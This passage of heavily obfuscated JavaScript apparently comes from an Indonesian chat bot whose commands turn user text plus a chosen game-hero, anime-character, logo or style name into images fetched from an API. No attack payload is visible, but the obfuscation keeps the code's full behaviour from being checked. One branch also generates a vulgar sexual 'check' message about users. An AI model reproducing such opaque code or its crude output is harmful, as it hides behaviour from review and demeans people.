7)],_0x1ce978[_0x240d04(0x18d0)],_0x1ce978[_0x240d04(0xc1c)],_0x1ce978['UXxxU'],_0x1ce978[_0x240d04(0x2b70)],_0x1ce978[_0x240d04(0x1a49)],'quillen-3',_0x1ce978[_0x240d04(0x9c0)],_0x1ce978[_0x240d04(0x2048)],_0x1ce978[_0x240d04(0x14d7)],_0x240d04(0x28e4),_0x1ce978[_0x240d04(0x4d0)],_0x240d04(0x17fa),_0x240d04(0x1485),_0x1ce978[_0x240d04(0x2966)],_0x1ce978[_0x240d04(0x1815)],_0x1ce978[_0x240d04(0x2d5)],_0x1ce978[_0x240d04(0xaa3)],_0x1ce978[_0x240d04(0x9e1)],_0x1ce978['jdDIL'],_0x240d04(0x158e),_0x1ce978[_0x240d04(0x3d5)],_0x1ce978['CkPrP'],_0x1ce978[_0x240d04(0x269e)],_0x1ce978[_0x240d04(0x26ca)],_0x1ce978[_0x240d04(0x23c1)],_0x1ce978['hLRkp'],_0x1ce978['ovgOd'],_0x1ce978[_0x240d04(0x40d)],_0x1ce978[_0x240d04(0x180b)],_0x1ce978[_0x240d04(0x216e)],_0x1ce978[_0x240d04(0x1e65)],_0x240d04(0x1b7a),_0x1ce978[_0x240d04(0x872)],_0x240d04(0x3d0),'lindis-3',_0x1ce978['yYwCX'],_0x1ce978[_0x240d04(0x2125)],_0x1ce978[_0x240d04(0xf8a)],_0x1ce978[_0x240d04(0x145c)],_0x1ce978[_0x240d04(0x101e)],'ybneth',_0x1ce978[_0x240d04(0x2039)],'arum-2',_0x1ce978[_0x240d04(0xa0b)],_0x1ce978[_0x240d04(0xe1)],_0x1ce978[_0x240d04(0xb4b)],_0x1ce978[_0x240d04(0x1717)],_0x1ce978[_0x240d04(0x2c5)],_0x1ce978['dgXnH'],'qi',_0x1ce978[_0x240d04(0x16b9)],'celica',_0x1ce978[_0x240d04(0x22f)],'diaochan-2',_0x1ce978['JGerk'],_0x1ce978[_0x240d04(0x1693)],_0x1ce978[_0x240d04(0x2b01)],_0x240d04(0x6a5),_0x1ce978[_0x240d04(0x18b9)],_0x240d04(0x684),_0x1ce978[_0x240d04(0x1356)],_0x1ce978[_0x240d04(0xe57)],_0x1ce978[_0x240d04(0x358)],_0x1ce978[_0x240d04(0xc5a)],_0x1ce978[_0x240d04(0x1320)],_0x1ce978[_0x240d04(0x2dee)],_0x1ce978[_0x240d04(0x854)],_0x1ce978['FCpzG'],_0x1ce978[_0x240d04(0x277f)],_0x240d04(0xc34)+'3',_0x1ce978[_0x240d04(0xb76)],_0x240d04(0x1ccd),_0x1ce978[_0x240d04(0x1ada)],_0x240d04(0x2b4f),_0x1ce978[_0x240d04(0x1e95)],_0x240d04(0x1c42),'lindis-2',_0x1ce978[_0x240d04(0x2a3a)],'nakroth-2',_0x240d04(0x2545),_0x240d04(0x2b1b),_0x240d04(0x2b6a),'ryoma-2','slimz',_0x1ce978[_0x240d04(0x27f)],_0x1ce978['FZdWC'],_0x1ce978[_0x240d04(0x87c)],_0x1ce978[_0x240d04(0x25e0)],_0x1ce978[_0x240d04(0x455)],_0x1ce978['ITSkQ'],_0x240d04(0x1b9f),_0x1ce978['sBvTl'],_0x1ce978['SLCkh'],_0x1ce978[_0x240d04(0x11bd)],_0x240d04(0x1903),_0x1ce978[_0x240d04(0x99b)],_0x1ce978[_0x240d04(0x1cda)],_0x1ce978['rUyRe'],_0x1ce978['lnDou'],_0x1ce978[_0x240d04(0x2542)],_0x1ce978[_0x240d04(0x2ca9)],_0x240d04(0xfef),_0x1ce978[_0x240d04(0x19dd)],_0x1ce978[_0x240d04(0x1264)],_0x1ce978[_0x240d04(0x2c75)],_0x1ce978['xgYQx'],_0x1ce978[_0x240d04(0x1164)],_0x1ce978[_0x240d04(0x27ef)],_0x1ce978['oqVwg'],_0x1ce978[_0x240d04(0x23d3)],_0x240d04(0x1dcd),_0x1ce978[_0x240d04(0x2a92)],_0x1ce978[_0x240d04(0x26fb)],_0x1ce978[_0x240d04(0x2600)],_0x1ce978[_0x240d04(0x2dd)],_0x240d04(0x2a7f),_0x240d04(0x16bf),_0x1ce978[_0x240d04(0x28f1)],_0x240d04(0x4af),_0x1ce978[_0x240d04(0x157)],_0x1ce978['lypjU'],_0x1ce978['HoHhi'],_0x1ce978[_0x240d04(0x1ff3)],_0x240d04(0xc6c),_0x1ce978[_0x240d04(0x2493)],_0x1ce978[_0x240d04(0xe57)],_0x1ce978[_0x240d04(0x2cff)],_0x240d04(0x102b),_0x1ce978[_0x240d04(0x3cc)],_0x1ce978['NknLV'],_0x240d04(0x19fd)+'n',_0x240d04(0x1cb8),_0x240d04(0x287e),_0x1ce978[_0x240d04(0x2a53)],_0x1ce978[_0x240d04(0xa53)],_0x1ce978[_0x240d04(0x10f6)],_0x1ce978[_0x240d04(0x2ea)],_0x1ce978[_0x240d04(0x953)],_0x1ce978[_0x240d04(0x18eb)],_0x1ce978[_0x240d04(0x1ac8)],_0x1ce978['qxFHe'],_0x240d04(0x2210),_0x1ce978[_0x240d04(0x2254)],_0x1ce978[_0x240d04(0xa79)],_0x1ce978[_0x240d04(0x21a5)],_0x1ce978['SGRWL'],'quillen',_0x240d04(0x2de9),_0x1ce978[_0x240d04(0x21c0)],_0x1ce978[_0x240d04(0x1381)],_0x1ce978[_0x240d04(0x1a66)],_0x1ce978[_0x240d04(0x2cd9)],_0x1ce978['TlhXJ'],_0x1ce978[_0x240d04(0xcf9)],_0x1ce978[_0x240d04(0x2b11)],'astrid',_0x1ce978['ttXwv'],_0x1ce978['xDPas'],_0x240d04(0x2e04),_0x1ce978[_0x240d04(0x21b2)],_0x240d04(0x1c5a),_0x240d04(0x2686),'ryoma-4',_0x1ce978['Iwwjf'],_0x1ce978[_0x240d04(0x2a9d)]];if(!_0x4b72c1[_0x240d04(0x55c)](_0x83dd4c)){if(_0x1ce978[_0x240d04(0x448)](_0x1ce978[_0x240d04(0x2b8b)],_0x1ce978[_0x240d04(0x2b8b)]))_0x555a99(_0x4b72c1,_0x4b72c1['length'],_0x1ce978[_0x240d04(0xe65)]);else{if(!_0x2d4168)return _0x1ce978['idYWD'](_0x4115f4,_0x1ce978[_0x240d04(0x2ad6)]);let _0x190784=(_0x240d04(0x1374)+_0x240d04(0x275f)+'』––––––*\x0a•'+_0x240d04(0x322)+_0x2aa634+('\x0a•\x20Memek\x20:'+'\x20')+_0x1ce978['WvtUE'](_0x351dd4,[_0x1ce978[_0x240d04(0x15d5)],_0x240d04(0x20ab)+'k',_0x240d04(0xb22),_0x1ce978['mxSDf'],_0x1ce978[_0x240d04(0x1004)],_0x1ce978['aKpTA'],_0x1ce978[_0x240d04(0x18f5)]])+(_0x240d04(0xcfe)+':\x20')+_0x1ce978[_0x240d04(0x247e)](_0x245f8f,[_0x1ce978[_0x240d04(0x22cb)],_0x1ce978['uoYPX'],_0x1ce978[_0x240d04(0xecd)],_0x1ce978[_0x240d04(0x1dc1)],_0x1ce978['zJIWL']])+('\x0a•\x20Jembut\x20'+':\x20')+_0x1ce978[_0x240d04(0x1b00)](_0x25377a,[_0x1ce978['KFAaE'],'Ada\x20sediki'+'t',_0x1ce978[_0x240d04(0x15cc)],_0x1ce978[_0x240d04(0x1bc6)],_0x1ce978[_0x240d04(0xd80)]])+'\x0a')['trim']();_0x1ce978[_0x240d04(0x1b37)](_0x4c38be,_0x190784);}}else{_0x1ce978[_0x240d04(0x1e9b)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x2ec1d0=_0x1ce978[_0x240d04(0x15f7)](api,_0x1ce978['WtcHl'],_0x1ce978[_0x240d04(0x1561)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'heroes':_0x83dd4c},_0x240d04(0x23aa)),_0x20e5cf=await _0x1ce978['pcERx'](fetch,_0x2ec1d0);if(!_0x20e5cf['ok'])throw await _0x20e5cf[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x2ec1d0},{'caption':lang['ok']});}}break;case _0x1ce978[_0x240d04(0x5c8)]:{if(_0x1ce978[_0x240d04(0x2873)](_0x1ce978[_0x240d04(0x3d9)],_0x1ce978['ySqXo'])){if(!_0x33cfb1)return _0x476bfb('Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0xfb5)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1192)+_0x240d04(0x2e9f)+_0x240d04(0x2890)+'n:\x0a`')+_0x1ce978[_0x240d04(0x29ce)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+'panda`'));if(!_0x33cfb1['includes']('|'))return _0x1ce978[_0x240d04(0x1084)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978['xoPCa'](_0x1ec495,_0x3e6565)+(_0x240d04(0x1192)+'e`\x0a\x0aContoh'+_0x240d04(0x2890)+_0x240d04(0x2df2))+_0x1ce978['KjHAW'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x27e)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x4790bd=[_0x1ce978[_0x240d04(0x2983)],_0x1ce978[_0x240d04(0x1063)],_0x1ce978['sAGWY'],_0x1ce978[_0x240d04(0x23f8)],_0x1ce978[_0x240d04(0x2d95)],_0x1ce978[_0x240d04(0x2d5b)],_0x1ce978['VxZaW'],_0x1ce978['sKNFe'],_0x1ce978[_0x240d04(0x2020)],_0x1ce978['kURDO'],_0x1ce978[_0x240d04(0x263e)],_0x1ce978[_0x240d04(0x1c74)],'bee',_0x240d04(0xdc9),'deer',_0x1ce978['DhVpb'],_0x1ce978[_0x240d04(0x1767)],_0x1ce978[_0x240d04(0xc9f)],_0x1ce978['xNwhv'],_0x1ce978[_0x240d04(0x1a6f)],_0x1ce978['kjveK'],_0x1ce978[_0x240d04(0x1946)],_0x1ce978[_0x240d04(0x2cb4)],_0x1ce978['KkfAI'],_0x1ce978['cbEQe'],_0x1ce978[_0x240d04(0x2d23)],_0x240d04(0x10e3),_0x1ce978[_0x240d04(0x39d)],_0x1ce978[_0x240d04(0x53a)],_0x1ce978[_0x240d04(0x1a12)],_0x1ce978[_0x240d04(0x19ea)],_0x1ce978[_0x240d04(0x1bba)],_0x1ce978[_0x240d04(0x27f8)],_0x1ce978['BJvsR'],_0x1ce978[_0x240d04(0x1804)],_0x1ce978['NKBws'],_0x1ce978[_0x240d04(0x1235)],_0x240d04(0xee0),_0x240d04(0x1be7),_0x1ce978[_0x240d04(0x12d4)],_0x1ce978[_0x240d04(0x1c74)],_0x1ce978[_0x240d04(0x27cf)],_0x1ce978[_0x240d04(0x28fa)],_0x1ce978[_0x240d04(0x1928)],_0x1ce978[_0x240d04(0x114c)],_0x240d04(0x7cc),_0x240d04(0x1c5),'warrior'];if(!_0x4790bd[_0x240d04(0x55c)](_0x83dd4c)){if(_0x1ce978[_0x240d04(0x9a2)](_0x1ce978[_0x240d04(0xe63)],_0x1ce978[_0x240d04(0x263b)]))return _0x1ce978['DfQwC'](_0x50effc,_0x240d04(0x19fe)+_0x240d04(0x23c6)+_0x240d04(0x1813)+_0x240d04(0x33b)+_0x240d04(0x2cfd)+'\x20untuk\x20mul'+'ai.');else _0x1ce978[_0x240d04(0x1aa3)](_0x555a99,_0x4790bd,_0x4790bd['length'],'style');}else{_0x1ce978[_0x240d04(0x2ec6)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x2182d7=_0x1ce978[_0x240d04(0xa8f)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x1643)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'style':_0x83dd4c},_0x1ce978['EEoOe']),_0x5b1c07=await fetch(_0x2182d7);if(!_0x5b1c07['ok'])throw await _0x5b1c07[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x2182d7},{'caption':lang['ok']});}}else return _0x1ce978[_0x240d04(0x21aa)](_0x3d4574,_0x1ce978[_0x240d04(0x1bb4)]);}break;case _0x1ce978[_0x240d04(0x2cfa)]:{if(_0x1ce978[_0x240d04(0x1eb5)](_0x1ce978[_0x240d04(0x2da7)],_0x240d04(0x8c8)))_0x1ce978[_0x240d04(0x18b3)](_0x2b54a5,_0x240d04(0x2a0b)+_0x240d04(0x101d)+_0x525fcc['entries'](_0x3f0277)[_0x240d04(0x16e6)](([_0x48eaa2,_0x10075e])=>'+\x20'+_0x961cef(_0x48eaa2)+'\x20'+_0x2b1984(_0x48eaa2)+':\x20'+_0x10075e)[_0x240d04(0x86e)]('\x0a'));else{if(!_0x33cfb1)return _0x1ce978['tqxsl'](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x27c)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1a2d)+_0x240d04(0xdcf)+_0x240d04(0x2d50)+':\x0a`')+_0x1ce978[_0x240d04(0x4f9)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x13bf)));if(!_0x33cfb1['includes']('|'))return _0x1ce978[_0x240d04(0x2de6)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978['SgeUa'](_0x1ec495,_0x3e6565)+('\x20teks|logo'+_0x240d04(0xdcf)+'penggunaan'+_0x240d04(0x23fb))+_0x1ce978[_0x240d04(0x1432)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x13bf)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x220d66=[_0x1ce978[_0x240d04(0x1928)],_0x1ce978['drpzd'],_0x240d04(0xab9),_0x1ce978['NbSvV'],_0x1ce978[_0x240d04(0x20d2)],_0x1ce978[_0x240d04(0x12bb)],_0x240d04(0x1f33),_0x1ce978[_0x240d04(0x1bba)],_0x1ce978[_0x240d04(0x28fa)],_0x1ce978[_0x240d04(0x102)],_0x1ce978[_0x240d04(0x28bf)],_0x1ce978[_0x240d04(0x104)],_0x240d04(0x2e83),_0x1ce978[_0x240d04(0x2f3)],_0x1ce978[_0x240d04(0x2527)],_0x1ce978[_0x240d04(0x19ea)],_0x1ce978[_0x240d04(0x263e)],_0x1ce978[_0x240d04(0x12d4)]];if(!_0x220d66['includes'](_0x83dd4c)){if(_0x1ce978[_0x240d04(0xdf6)](_0x1ce978['fjXTd'],_0x1ce978['fjXTd']))return _0x1ce978[_0x240d04(0x2b67)](_0x3f7dd2,_0x240d04(0x14f0)+'ang\x20dipenj'+_0x240d04(0x13c8)+_0x240d04(0xd01)+'\x20untuk\x20mem'+_0x240d04(0x156f)+'a\x20dan\x20kelu'+_0x240d04(0x1855));else _0x1ce978[_0x240d04(0xf7b)](_0x555a99,_0x220d66,_0x220d66[_0x240d04(0x2b45)],_0x1ce978['jZgVp']);}else{_0x1ce978[_0x240d04(0x23f2)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x108bf8=_0x1ce978['rsZFk'](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978['jrCNG']+_0x3e6565,{'text':_0x2b7b14,'logo':_0x83dd4c},_0x1ce978['EEoOe']),_0x532cb3=await fetch(_0x108bf8);if(!_0x532cb3['ok'])throw await _0x532cb3[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x108bf8},{'caption':lang['ok']});}}}break;case _0x1ce978[_0x240d04(0x4a2)]:{if(!_0x33cfb1)return _0x476bfb('Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x2377)](_0x1ec495,_0x3e6565)+('\x20teks|hero'+_0x240d04(0x13ff)+_0x240d04(0x1d12)+_0x240d04(0x2ee2))+_0x1ce978['cPMyz'](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x1ad5)));if(!_0x33cfb1['includes']('|'))return _0x1ce978[_0x240d04(0x2d87)](_0x476bfb,'Kirim\x20peri'+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x2ee0)](_0x1ec495,_0x3e6565)+(_0x240d04(0xd93)+_0x240d04(0x13ff)+_0x240d04(0x1d12)+'an:\x0a`')+_0x1ce978[_0x240d04(0x15ca)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x1ad5)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x4fd19c=[_0x240d04(0x14aa),_0x1ce978['MpsOD'],_0x1ce978[_0x240d04(0xb37)],_0x1ce978[_0x240d04(0x11a2)],'chou',_0x1ce978[_0x240d04(0x1a91)],_0x1ce978['jDgaK'],_0x1ce978[_0x240d04(0x135b)],_0x240d04(0x701),_0x240d04(0x2c4b),_0x1ce978[_0x240d04(0x9ae)],_0x1ce978[_0x240d04(0x21d6)],_0x1ce978[_0x240d04(0x407)],_0x1ce978[_0x240d04(0xb75)],_0x1ce978['pUwhh'],_0x1ce978[_0x240d04(0x29af)],_0x1ce978[_0x240d04(0x2234)],_0x240d04(0x10b6),_0x240d04(0x84d),'saber',_0x1ce978[_0x240d04(0x1446)],_0x240d04(0x2297),_0x1ce978[_0x240d04(0x15c8)],'dyrroth',_0x1ce978[_0x240d04(0x28be)],_0x1ce978['eBGFo'],_0x1ce978[_0x240d04(0xa27)],_0x1ce978[_0x240d04(0x248e)],_0x240d04(0x781),_0x1ce978['PRTzi'],_0x240d04(0x12cf),'xborg',_0x1ce978[_0x240d04(0x222e)],_0x1ce978[_0x240d04(0x11bd)],_0x1ce978['VlbhN'],_0x1ce978[_0x240d04(0x2146)],_0x1ce978[_0x240d04(0xea4)],_0x240d04(0xb90),_0x240d04(0x233a),_0x1ce978[_0x240d04(0xe8)],_0x1ce978['CkaMQ'],_0x1ce978[_0x240d04(0x27d2)],_0x1ce978[_0x240d04(0x1a4e)],_0x1ce978[_0x240d04(0xd73)],_0x240d04(0x20eb),_0x240d04(0x1b9e),_0x1ce978[_0x240d04(0x1627)],_0x1ce978[_0x240d04(0x21d8)],_0x1ce978[_0x240d04(0x1e0c)],_0x1ce978[_0x240d04(0x7b6)],_0x1ce978[_0x240d04(0x250c)],_0x1ce978[_0x240d04(0x282f)],_0x1ce978[_0x240d04(0x1af)],_0x1ce978[_0x240d04(0x2c8f)],_0x1ce978[_0x240d04(0x1fe0)],_0x1ce978[_0x240d04(0x196c)],_0x240d04(0xdf9),_0x240d04(0x143e),_0x1ce978[_0x240d04(0x23bb)],_0x1ce978['efZHt'],_0x1ce978[_0x240d04(0x5bf)],_0x1ce978[_0x240d04(0x193b)],_0x1ce978[_0x240d04(0x295c)],_0x240d04(0x220c),_0x1ce978[_0x240d04(0x114b)],_0x1ce978[_0x240d04(0x1891)],_0x240d04(0x2e8d),_0x1ce978[_0x240d04(0x1e54)],_0x240d04(0x1e0f),_0x1ce978[_0x240d04(0xf8e)],_0x1ce978['fyury'],_0x240d04(0xb6e),_0x1ce978[_0x240d04(0x20af)],_0x1ce978[_0x240d04(0x751)],_0x1ce978[_0x240d04(0x1bf7)],_0x1ce978[_0x240d04(0xb7)],_0x1ce978[_0x240d04(0x1d8f)],_0x1ce978[_0x240d04(0xaa6)],_0x1ce978['nWRJF'],_0x1ce978[_0x240d04(0x1318)],_0x1ce978[_0x240d04(0xd0b)],_0x1ce978[_0x240d04(0x24df)],_0x1ce978[_0x240d04(0x1c3b)],_0x1ce978[_0x240d04(0x52b)],_0x240d04(0x2351),_0x1ce978[_0x240d04(0x123b)],_0x1ce978[_0x240d04(0x1771)],_0x1ce978['cFkUO'],_0x1ce978[_0x240d04(0x1e80)],_0x1ce978[_0x240d04(0x1d24)],_0x240d04(0x1a4a),_0x1ce978['bBHyL'],_0x240d04(0xc67),_0x240d04(0x2397)];if(!_0x4fd19c[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0x295f)](_0x555a99,_0x4fd19c,_0x4fd19c[_0x240d04(0x2b45)],_0x240d04(0x22ff));else{_0x476bfb(lang[_0x240d04(0x172a)]);let _0x394531=_0x1ce978[_0x240d04(0x15f7)](api,_0x240d04(0x10a),_0x1ce978[_0x240d04(0x2377)](_0x1ce978['jrCNG'],_0x3e6565),{'text':_0x2b7b14,'heroes':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x41d3b0=await fetch(_0x394531);if(!_0x41d3b0['ok'])throw await _0x41d3b0[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+'hoto']({'url':_0x394531},{'caption':lang['ok']});}}break;case _0x1ce978[_0x240d04(0x28d)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x439)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x1860)+_0x240d04(0x1a3f)+_0x240d04(0x1f79)+'unaan:\x0a`')+_0x1ce978[_0x240d04(0x2db2)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xf53)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978['kTLau'](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978['sBCkk'](_0x1ec495,_0x3e6565)+(_0x240d04(0x1860)+'acter`\x0a\x0aCo'+_0x240d04(0x1f79)+_0x240d04(0x2a75))+_0x1ce978[_0x240d04(0xa47)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'kale`'));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x27447c=[_0x1ce978[_0x240d04(0xd50)],_0x1ce978[_0x240d04(0x3dd)],_0x1ce978[_0x240d04(0x1ae2)],_0x1ce978[_0x240d04(0x978)],_0x1ce978[_0x240d04(0x2633)],_0x1ce978['gnMjq'],_0x1ce978[_0x240d04(0x902)],_0x1ce978[_0x240d04(0x2107)],_0x1ce978[_0x240d04(0x1599)],_0x1ce978[_0x240d04(0x1642)],_0x1ce978[_0x240d04(0x5fe)],'xenovegito',_0x1ce978[_0x240d04(0x2d80)],_0x1ce978[_0x240d04(0x16b)],_0x1ce978[_0x240d04(0x234c)],_0x1ce978[_0x240d04(0x842)],_0x1ce978[_0x240d04(0x2ac2)],_0x1ce978[_0x240d04(0x1c4d)],_0x1ce978['lAkHL'],_0x1ce978['tnbdp'],'nutenroshi'+'-2',_0x240d04(0x2247),_0x1ce978[_0x240d04(0xa91)],_0x1ce978[_0x240d04(0x14e3)],_0x1ce978[_0x240d04(0x1a9)],_0x240d04(0x25de),'bardock','gotenks',_0x240d04(0x2154),_0x1ce978['qJDWl'],_0x1ce978[_0x240d04(0x2213)],_0x1ce978[_0x240d04(0x12c9)],_0x1ce978[_0x240d04(0x27fe)],_0x1ce978[_0x240d04(0x1649)],_0x240d04(0x25b5),_0x240d04(0x1839),_0x1ce978['AYakI'],_0x1ce978[_0x240d04(0x2374)],_0x1ce978['WxHKl'],_0x1ce978['oIzMb'],_0x1ce978[_0x240d04(0x190f)],_0x1ce978['HwZJf']];if(!_0x27447c[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0x1cbb)](_0x555a99,_0x27447c,_0x27447c[_0x240d04(0x2b45)],_0x1ce978['zjFKN']);else{_0x1ce978[_0x240d04(0x206e)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x5d9fac=_0x1ce978[_0x240d04(0x15f7)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x2934)]('/api/ephot'+_0x240d04(0x1d21),_0x3e6565),{'text':_0x2b7b14,'character':_0x83dd4c},_0x1ce978['EEoOe']),_0x4c89ea=await _0x1ce978[_0x240d04(0x531)](fetch,_0x5d9fac);if(!_0x4c89ea['ok'])throw await _0x4c89ea[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x5d9fac},{'caption':lang['ok']});}}break;case _0x1ce978[_0x240d04(0x1fb7)]:{if(_0x1ce978[_0x240d04(0xf50)]===_0x1ce978['aDrFZ']){if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x14e1)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1808)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1860)+_0x240d04(0x1a3f)+_0x240d04(0x1f79)+_0x240d04(0x2a75))+_0x1ce978[_0x240d04(0x1fc5)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x69d)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x1688)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0xa98)](_0x1ec495,_0x3e6565)+('\x20teks|char'+_0x240d04(0x1a3f)+_0x240d04(0x1f79)+_0x240d04(0x2a75))+_0x1ce978[_0x240d04(0x125c)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x69d)));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x29f2b6=[_0x240d04(0x1846),_0x1ce978['SlAvG'],_0x240d04(0x10d),_0x1ce978[_0x240d04(0x1be)],_0x1ce978[_0x240d04(0x1777)],_0x240d04(0x1bb6),_0x240d04(0x2d09),_0x240d04(0x1179),_0x1ce978[_0x240d04(0x2500)],_0x1ce978[_0x240d04(0x25a7)],_0x1ce978[_0x240d04(0x2bf2)],_0x1ce978[_0x240d04(0x838)],_0x1ce978[_0x240d04(0x1329)],_0x1ce978['cnvVM'],_0x1ce978[_0x240d04(0x19bd)],'butterfly-'+'4',_0x240d04(0xc34)+'5',_0x1ce978['pAuRf'],_0x1ce978['edsXa'],_0x1ce978[_0x240d04(0xec)],_0x1ce978[_0x240d04(0x23db)],_0x1ce978[_0x240d04(0xafa)],_0x1ce978[_0x240d04(0x1b13)],_0x1ce978[_0x240d04(0xb32)],'mina-4',_0x240d04(0x25a0),_0x1ce978['gYTcN'],'arum-3',_0x1ce978['fnGKB'],_0x1ce978['Rwqce'],_0x1ce978[_0x240d04(0xb14)],_0x1ce978[_0x240d04(0x2a68)],_0x1ce978[_0x240d04(0x1b2d)],_0x240d04(0x1d02),'ishar-4',_0x1ce978[_0x240d04(0xdda)],_0x240d04(0x4b1),_0x1ce978[_0x240d04(0x2acb)],_0x1ce978[_0x240d04(0x850)],'mina-3',_0x1ce978[_0x240d04(0xa72)],_0x1ce978['mpgWy'],_0x1ce978['QDeeM'],_0x240d04(0x213e),_0x1ce978[_0x240d04(0xc5a)],_0x1ce978[_0x240d04(0x1f92)],'lindis-2',_0x240d04(0x2cc),_0x1ce978[_0x240d04(0x146a)],_0x1ce978['BncXb'],_0x1ce978[_0x240d04(0xd4d)],_0x1ce978[_0x240d04(0xcd6)],_0x240d04(0x27b1),_0x240d04(0xe41),_0x1ce978[_0x240d04(0x1f62)],_0x1ce978[_0x240d04(0x876)],_0x1ce978[_0x240d04(0x298a)],'zephys2',_0x1ce978[_0x240d04(0x150)],_0x1ce978[_0x240d04(0x4e0)],_0x1ce978['vcGVx'],'thorne',_0x240d04(0x1549),_0x1ce978[_0x240d04(0x1772)],_0x1ce978[_0x240d04(0x2505)],_0x1ce978['frheA'],_0x1ce978[_0x240d04(0x240a)],'butterfly3',_0x1ce978[_0x240d04(0x777)],_0x1ce978['PlPdV'],_0x1ce978['bVlKs'],_0x1ce978[_0x240d04(0x224e)],_0x1ce978[_0x240d04(0x1cc5)],_0x1ce978[_0x240d04(0x2d92)],_0x1ce978[_0x240d04(0x13e7)],_0x1ce978[_0x240d04(0x300)],_0x1ce978[_0x240d04(0x26aa)],_0x1ce978[_0x240d04(0x18e2)],_0x1ce978[_0x240d04(0x26d1)],_0x1ce978[_0x240d04(0xae3)],'florentino'+'2',_0x1ce978['PFQXr'],_0x1ce978['KozAw'],_0x1ce978['KiDzg'],_0x1ce978['nYqus'],_0x1ce978[_0x240d04(0xcdd)],_0x1ce978[_0x240d04(0x15ff)],_0x240d04(0x2b79),_0x1ce978[_0x240d04(0x9d5)],_0x1ce978['TCzeR'],_0x1ce978[_0x240d04(0x1d45)],_0x1ce978['DUOfs'],_0x1ce978['TAFYJ'],_0x1ce978[_0x240d04(0x20f)],_0x1ce978[_0x240d04(0xc39)],_0x1ce978[_0x240d04(0xa72)],_0x1ce978[_0x240d04(0x3a6)],_0x240d04(0x2998),_0x1ce978[_0x240d04(0x235e)],_0x240d04(0x2897),_0x1ce978['yShjK'],_0x240d04(0x1079),_0x1ce978['ktLbk'],_0x1ce978['VyTCh'],_0x1ce978[_0x240d04(0x21e9)],_0x1ce978[_0x240d04(0x233c)],_0x1ce978['zHAIb'],_0x1ce978[_0x240d04(0x1369)],_0x1ce978['wzbef'],_0x1ce978['BZczi'],_0x1ce978['vRGGE'],_0x1ce978['MbqxB'],_0x1ce978[_0x240d04(0x1e8b)],_0x240d04(0x25c3),_0x1ce978['BUiMs'],_0x1ce978[_0x240d04(0x2528)],_0x1ce978[_0x240d04(0x1ba1)],